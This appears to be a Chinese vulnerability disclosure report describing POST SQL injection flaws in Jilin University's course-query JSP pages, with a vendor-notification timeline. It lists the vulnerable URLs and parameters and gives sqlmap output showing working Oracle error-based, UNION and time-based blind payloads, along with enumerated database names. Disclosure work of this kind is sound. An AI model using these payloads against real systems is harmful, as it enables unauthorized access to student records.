wybug_title: 吉林大学Oracle POST注射漏洞大礼包
wybug_detail:
漏洞详情 披露状态：   									2014-06-07：	细节已通知厂商并且等待厂商处理中									2014-06-09：	厂商已经确认，细节仅向厂商公开									2014-06-19：	细节向核心白帽子及相关领域专家公开									2014-06-29：	细节向普通白帽子公开									2014-07-09：	细节向实习白帽子公开									2014-07-23：	细节向公众公开  简要描述： 吉林大学Oracle POST注射漏洞大礼包。求20rank。 详细说明：  http://apps.jlu.edu.cn:808/jwk-xk/cx/kbcx/stuQueryMain.jsp(POST)stuQueryKind=manStu&inStu_pass=manager&submit=%C8%B7%EF%BF%BD%EF%BF%BD&inStu_no=88952634http://apps.jlu.edu.cn:808/jwk-xk/cx/kbcx/nameQueryCourse.jsp submit=%C8%B7%EF%BF%BD%EF%BF%BD&stuName=88952634 存在POST sql注入漏洞http://apps.jlu.edu.cn:808/jwk-xk/cx/kbcx/manQueryCourseStu.jsp inCourseSeq=88952634&submit=%C8%B7%EF%BF%BD%EF%BF%BD&inCourseNo=88952634 存在POST sql注入漏洞http://apps.jlu.edu.cn:808/jwk-xk/cx/kbcx/manQueryCourseStu.jsp inCourseNo=88952634&submit=%C8%B7%EF%BF%BD%EF%BF%BD&inCourseSeq=88952634 存在POST sql注入漏洞http://apps.jlu.edu.cn:808/jwk-xk/cx/kbcx/zstuQueryRealBean.jsp submit=%EF%BF%BD%EF%BF%BD%D1%AF%EF%BF%BD%CE%B3%EF%BF%BD%EF%BF%BD%EF%BF%BD%CF%B8%EF%BF%BD%EF%BF%BD&inStu_no=null 存在POST sql注入漏洞http://apps.jlu.edu.cn:808/jwk-xk/cx/kbcx/stuQueryTableBean.jsp submit=%EF%BF%BD%EF%BF%BD%20%CA%BE%20%EF%BF%BD%EF%BF%BD%20%EF%BF%BD%EF%BF%BD%20%EF%BF%BD%EF%BF%BD&inStu_no=null 存在POST sql注入漏洞http://apps.jlu.edu.cn:808/jwk-xk/cx/kbcx/stuQueryPrintTableBean.jsp submit=%EF%BF%BD%EF%BF%BD%20%D3%A1%20%EF%BF%BD%EF%BF%BD%20%EF%BF%BD%EF%BF%BD%20%EF%BF%BD%EF%BF%BD&inStu_no=null 存在POST sql注入漏洞   漏洞证明：  Place: POSTParameter: inStu_no    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: stuQueryKind=manStu&inStu_pass=manager&submit=%C8%B7%EF%BF%BD%EF%BF%BD&inStu_no=88952634' AND 9018=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(102)||CHR(121)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9018=9018) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(105)||CHR(104)||CHR(119)||CHR(113)||CHR(62))) FROM DUAL) AND 'bHzT'='bHzT    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: stuQueryKind=manStu&inStu_pass=manager&submit=%C8%B7%EF%BF%BD%EF%BF%BD&inStu_no=88952634' UNION ALL SELECT CHR(113)||CHR(102)||CHR(121)||CHR(106)||CHR(113)||CHR(89)||CHR(73)||CHR(65)||CHR(110)||CHR(74)||CHR(107)||CHR(66)||CHR(74)||CHR(101)||CHR(106)||CHR(113)||CHR(105)||CHR(104)||CHR(119)||CHR(113) FROM DUAL--     Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: stuQueryKind=manStu&inStu_pass=manager&submit=%C8%B7%EF%BF%BD%EF%BF%BD&inStu_no=88952634' AND 9002=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'rgbj'='rgbj---web application technology: JSPback-end DBMS: Oraclesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: inStu_no    Type: error-based    Title: Oracle AND error-based - 1 column    Payload: stuQueryKind=manStu&inStu_pass=manager&submit=%C8%B7%EF%BF%BD%EF%BF%BD&inStu_no=88952634' UNION ALL SELECT CHR(113)||CHR(102)||CHR(121)||CHR(106)||CHR(113)||CHR(89)||CHR(73)||CHR(65)||CHR(110)||CHR(74)||CHR(107)||CHR(66)||CHR(74)||CHR(101)||CHR(106)||CHR(113)||CHR(105)||CHR(104)||CHR(119)||CHR(113) FROM DUAL--     Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: stuQueryKind=manStu&inStu_pass=manager&submit=%C8%B7%EF%BF%BD%EF%BF%BD&inStu_no=88952634' AND 9002=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'rgbj'='rgbj---web application technology: JSPback-end DBMS: Oracleavailable databases [9]:[*] CTXSYS[*] EXFSYS[*] JWK_NL[*] MDSYS[*] OLAPSYS[*] SYS[*] SYSTEM[*] WMSYS[*] ZYC
